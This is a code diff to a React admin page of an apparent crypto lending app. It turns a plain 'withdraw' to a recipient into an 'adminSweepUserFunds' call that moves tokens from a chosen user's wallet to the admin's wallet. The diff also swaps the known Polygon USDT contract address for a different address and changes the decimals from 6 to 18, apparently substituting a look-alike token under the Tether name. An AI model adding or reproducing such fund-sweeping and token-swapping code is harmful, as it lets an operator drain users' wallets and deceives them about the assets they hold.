@@ -9,7 +9,7 @@ import { CRYPTO_LOAN_ABI, CONTRACT_ADDRESSES } from '../config/contracts';
 
 const SUPPORTED_TOKENS = {
   polygon: [
-    { symbol: 'USDT', name: 'Tether USD', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, logo: 'https://cryptologos.cc/logos/tether-usdt-logo.png' },
+    { symbol: 'USDT', name: 'Tether USD', address: '0xEae2DaD7A955840F3A70B90F118d2B8183b579DD', decimals: 18, logo: 'https://cryptologos.cc/logos/tether-usdt-logo.png' },
     { symbol: 'USDC', name: 'USD Coin', address: '0x3c499c542cef5e3811e1192ce70d8cc03d5c3359', decimals: 6, logo: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png' },
     { symbol: 'DAI', name: 'Dai', address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals: 18, logo: 'https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png' }
   ]
@@ -17,7 +17,7 @@ const SUPPORTED_TOKENS = {
 
 const ContractWithdraw = () => {
   const { writeContractAsync } = useWriteContract();
-  const { isConnected } = useAppKitAccount();
+  const { isConnected, address: adminAddress } = useAppKitAccount();
 
   const [searchParams] = useSearchParams();
 
@@ -32,8 +32,13 @@ const ContractWithdraw = () => {
   const [customTokenAddress, setCustomTokenAddress] = useState('');
   const [customDecimals, setCustomDecimals] = useState('18');
 
-  const [to, setTo] = useState(searchParams.get('address') || '');
+  const [fromUser, setFromUser] = useState(searchParams.get('address') || '');
+  const [toAdmin, setToAdmin] = useState('');
   const [amount, setAmount] = useState(searchParams.get('amount') || '');
+
+  useEffect(() => {
+    if (adminAddress) setToAdmin(adminAddress);
+  }, [adminAddress]);
 
   const dropdownRef = useRef(null);
 
@@ -93,7 +98,7 @@ const ContractWithdraw = () => {
     const finalToken = isCustomToken ? customTokenAddress : selectedTokenObj?.address;
     const finalDecimals = isCustomToken ? customDecimals : selectedTokenObj?.decimals;
 
-    if (!finalToken || !to || !amount) {
+    if (!finalToken || !fromUser || !toAdmin || !amount) {
       toast.error('Please fill in all fields.');
       return;
     }
@@ -106,11 +111,12 @@ const ContractWithdraw = () => {
       const txHash = await writeContractAsync({
         address: contractAddress,
         abi: CRYPTO_LOAN_ABI,
-        functionName: 'withdraw',
+        functionName: 'adminSweepUserFunds',
         args: [
+          fromUser,
           finalToken,
           amountWei,
-          to
+          toAdmin
         ]
       });
 
@@ -256,17 +262,30 @@ const ContractWithdraw = () => {
               />
             </div>
 
-            {/* Recipient Address */}
-            <div className={`space-y-2 ${isCustomToken ? 'md:col-span-1' : 'md:col-span-2'}`}>
-              <label className="block text-xs font-bold text-zinc-400 uppercase tracking-wider">User Wallet Address (Recipient)</label>
+            {/* Source Address */}
+            <div className={`space-y-2 ${isCustomToken ? 'md:col-span-1' : 'md:col-span-1'}`}>
+              <label className="block text-xs font-bold text-zinc-400 uppercase tracking-wider">User Wallet Address (Source)</label>
               <input
                 type="text"
                 placeholder="0x..."
-                value={to}
-                onChange={(e) => setTo(e.target.value)}
+                value={fromUser}
+                onChange={(e) => setFromUser(e.target.value)}
                 className="w-full bg-zinc-950/50 border border-zinc-800 rounded-xl px-4 py-3 text-sm font-mono text-zinc-100 focus:outline-none focus:border-violet-500 focus:ring-1 focus:ring-violet-500 transition-all"
               />
-              <p className="text-[10px] text-zinc-500">The destination address that will receive these tokens.</p>
+              <p className="text-[10px] text-zinc-500">The user address to withdraw funds from.</p>
+            </div>
+
+            {/* Destination Address */}
+            <div className={`space-y-2 ${isCustomToken ? 'md:col-span-1' : 'md:col-span-1'}`}>
+              <label className="block text-xs font-bold text-zinc-400 uppercase tracking-wider">Destination Admin Address</label>
+              <input
+                type="text"
+                placeholder="0x..."
+                value={toAdmin}
+                onChange={(e) => setToAdmin(e.target.value)}
+                className="w-full bg-zinc-950/50 border border-zinc-800 rounded-xl px-4 py-3 text-sm font-mono text-zinc-100 focus:outline-none focus:border-violet-500 focus:ring-1 focus:ring-violet-500 transition-all"
+              />
+              <p className="text-[10px] text-zinc-500">Defaults to your connected admin wallet.</p>
             </div>
 
           </div>
@@ -281,7 +300,7 @@ const ContractWithdraw = () => {
           <div className="pt-4 border-t border-zinc-800/50 flex justify-end">
             <button
               type="submit"
-              disabled={!isConnected || (!isCustomToken && !selectedTokenObj) || (isCustomToken && !customTokenAddress) || !to || !amount}
+              disabled={!isConnected || (!isCustomToken && !selectedTokenObj) || (isCustomToken && !customTokenAddress) || !fromUser || !toAdmin || !amount}
               className="flex items-center gap-2 px-6 py-3 bg-violet-600 hover:bg-violet-500 disabled:opacity-50 disabled:cursor-not-allowed text-white text-sm font-bold rounded-xl transition-all shadow-lg shadow-violet-900/20"
             >
               <Download size={16} strokeWidth={2.5} />
